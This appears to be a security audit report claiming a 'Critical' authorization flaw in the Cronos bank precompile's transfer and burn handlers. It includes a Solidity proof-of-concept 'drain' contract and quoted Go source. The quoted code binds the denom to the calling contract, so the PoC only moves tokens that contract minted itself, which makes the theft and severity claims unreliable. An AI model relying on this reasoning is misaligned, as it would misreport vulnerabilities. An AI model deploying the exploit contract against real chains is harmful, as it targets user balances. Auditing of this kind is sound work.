### Title
Unauthenticated `sender` in Bank Precompile `transfer` Allows Any Contract to Drain Arbitrary Holders - (File: x/cronos/keeper/precompiles/bank.go)

### Summary

The `BankContract.Run` handler for `TransferMethodName` in the bank precompile accepts a `sender` address as a call argument and uses it directly as the debit account in `bankKeeper.SendCoins`, without verifying that `sender` matches `contract.Caller()` (the actual EVM caller). Any EVM contract can therefore call `transfer(victimAddress, attackerAddress, amount)` and drain the victim's native bank-module balance of the `evm/<callerContract>` denom without any authorization from the victim.

### Finding Description

In `x/cronos/keeper/precompiles/bank.go`, the `TransferMethodName` branch of `BankContract.Run`:

```go
// lines 175-192
sender := args[0].(common.Address)   // caller-supplied, not verified
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())  // evm/<callerContract>
amt   := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

`sender` (i.e. `from`) is taken verbatim from the ABI-decoded call arguments. There is **no check** that `sender == contract.Caller()`. Compare this with the `exec` helper in `utils.go`, which explicitly enforces `caller == e.caller` before any state mutation: [2](#0-1) 

The bank precompile's `transfer` path performs no equivalent guard.

The `burn` branch has the same structural flaw — `recipient` (the address whose tokens are burned) is also caller-supplied with no identity check: [3](#0-2) 

### Impact Explanation

**Critical — unauthorized transfer/burn of native bank-module assets.**

The bank precompile manages native Cosmos SDK coins with denom `evm/<callerContractAddress>`. These are real on-chain balances tracked by the bank module, not EVM storage slots. A malicious contract `M` can:

1. Call `transfer(victimAddress, attackerAddress, N)` on the bank precompile (address `0x64`).
2. The precompile computes `denom = evm/M` and executes `bankKeeper.SendCoins(victimAddress → attackerAddress, N evm/M)`.
3. All `evm/M` tokens held by `victimAddress` are transferred to the attacker with no consent from the victim.

This satisfies the Critical impact criterion: **unauthorized transfer of precompile-controlled assets** for any address holding `evm/<M>` tokens. [4](#0-3) 

### Likelihood Explanation

**High.** The entry path is fully unprivileged — any deployed EVM contract can call the bank precompile. No special role, key, or governance action is required. The only precondition is that the victim holds a non-zero balance of `evm/<attackerContract>` tokens, which the attacker can engineer by first minting tokens to victims (the `mint` branch also uses `contract.Caller()` as the denom authority, so the attacker's contract controls issuance).

### Recommendation

In the `TransferMethodName` branch, verify that the decoded `sender` matches the actual EVM caller before executing the bank transfer:

```go
if sender != contract.Caller() {
    return nil, errors.New("sender does not match caller")
}
```

Apply the same guard to the `BurnMethodName` branch (verify `recipient == contract.Caller()`). This mirrors the pattern already used in `utils.go`'s `exec` helper. [5](#0-4) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    // selector: transfer(address,address,uint256) → 0xbeabacc8
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
    function mint(address recipient, uint256 amount) external returns (bool);
}

contract AttackBank {
    IBankPrecompile constant bank = IBankPrecompile(address(0x64));

    // Step 1: mint evm/<address(this)> tokens to victim (social-engineering / airdrop)
    function seedVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: drain victim's evm/<address(this)> balance to attacker — no victim approval needed
    function drain(address victim, address attacker, uint256 amount) external {
        // sender = victim, but contract.Caller() = address(this) — no check enforced
        bank.transfer(victim, attacker, amount);
    }
}
```

1. Deploy `AttackBank` at address `M`.
2. Call `seedVictim(victim, 1000)` — victim now holds `1000 evm/M` in the bank module.
3. Call `drain(victim, attacker, 1000)` — the bank precompile executes `SendCoins(victim → attacker, 1000 evm/M)` with no authorization from victim.
4. Victim's balance is zero; attacker holds 1000 `evm/M`. [6](#0-5)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L103-200)
```go
func (bc *BankContract) Run(evm *vm.EVM, contract *vm.Contract, readonly bool) ([]byte, error) {
	// parse input
	methodID := contract.Input[:4]
	method, err := bankABI.MethodById(methodID)
	if err != nil {
		return nil, err
	}
	stateDB := evm.StateDB.(ExtStateDB)
	precompileAddr := bc.Address()
	switch method.Name {
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
	case BalanceOfMethodName:
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		token := args[0].(common.Address)
		addr := args[1].(common.Address)
		// query from storage
		balance := bc.bankKeeper.GetBalance(stateDB.Context(), sdk.AccAddress(addr.Bytes()), EVMDenom(token)).Amount.BigInt()
		return method.Outputs.Pack(balance)
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/keeper/precompiles/utils.go (L46-49)
```go
	caller := common.BytesToAddress(signers[0])
	if caller != e.caller {
		return nil, fmt.Errorf("caller is not authenticated: expected %s, got %s", e.caller.Hex(), caller.Hex())
	}
```
